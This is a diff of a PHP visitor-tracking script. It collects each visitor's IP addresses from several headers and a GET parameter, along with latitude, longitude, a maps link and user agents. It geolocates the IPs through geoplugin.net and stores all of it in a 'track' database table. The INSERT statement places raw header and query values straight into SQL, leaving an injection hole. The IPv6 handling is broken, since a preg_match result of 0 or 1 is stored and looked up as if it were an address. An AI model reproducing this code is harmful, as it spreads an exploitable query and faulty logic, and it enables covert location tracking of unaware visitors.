@@ -53,31 +53,38 @@ $google = "https://maps.google.com/maps?q=loc:".$lat."+".$lon;}
 if ($client != NULL){
 $clientv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_CLIENT_IP']);
 $clientgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$client));
-$clientv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$clientv6));}
+if ($clientv6 != 0){
+$clientv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$clientv6));}}
 if ($xforf != NULL){
 $xforfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED_FOR']);
 $xforfgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforf));
-$xforfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforfv6));}
+if ($xforfv6 != 0){
+$xforfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforfv6));}}
 if ($xfor != NULL){
 $xforv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_X_FORWARDED']);
 $xforgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xfor));
-$xforv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforv6));}
+if ($xforv6 != 0){
+$xforv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$xforv6));}}
 if ($forf != NULL){
 $forfv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED_FOR']);
 $forfgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forf));
-$forfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forfv6));}
+if ($forfv6 != 0){
+$forfv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forfv6));}}
 if ($for != NULL){
 $forv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_FORWARDED']);
 $forgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$for));
-$forv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forv6));}
+if ($forv6 != 0){
+$forv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$forv6));}}
 if ($ip != NULL){
 $ipv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['REMOTE_ADDR']);
 $ipgeo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ip));
-$ipv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipv6));}
+if ($ipv6 != 0){
+$ipv6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipv6));}}
 if ($ipa != NULL){
 $ipav6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_GET['addr']);
 $ipageo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipa));
-$ipav6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6));}
+if ($ipav6 != 0){
+$ipav6geo = serialize(file_get_contents("http://geoplugin.net/php.gp?ip=".$ipav6));}}
 include 'huMf6GwI0pbSg1k.php';
 $conn = OpenCon();
 $sql = "INSERT INTO track(client,xforf,xfor,forf,for,ip,ipa,lat,lon,google,clientv6,xforfv6,xforv6,forfv6,forv6,ipv6,ipav6,agent,hagent,gagent,clientgeo,xforfgeo,xforgeo,forfgeo,forgeo,ipgeo,ipageo,clientv6geo,xforfv6geo,xforv6geo,forfv6geo,forv6geo,ipv6geo,ipav6geo) VALUES ('$client','$xforf','$xfor','$forf','$for','$ip','$ipa','$lat','$lon','$google','$clientv6','$xforfv6','$xforv6','$forfv6','$forv6','$ipv6','$ipav6','$agent','$hagent','$gagent','$clientgeo','$xforfgeo','$xforgeo','$forfgeo','$forgeo','$ipgeo','$ipageo','$clientv6geo','$xforfv6geo','$xforv6geo','$forfv6geo','$forv6geo','$ipv6geo','$ipav6geo')";
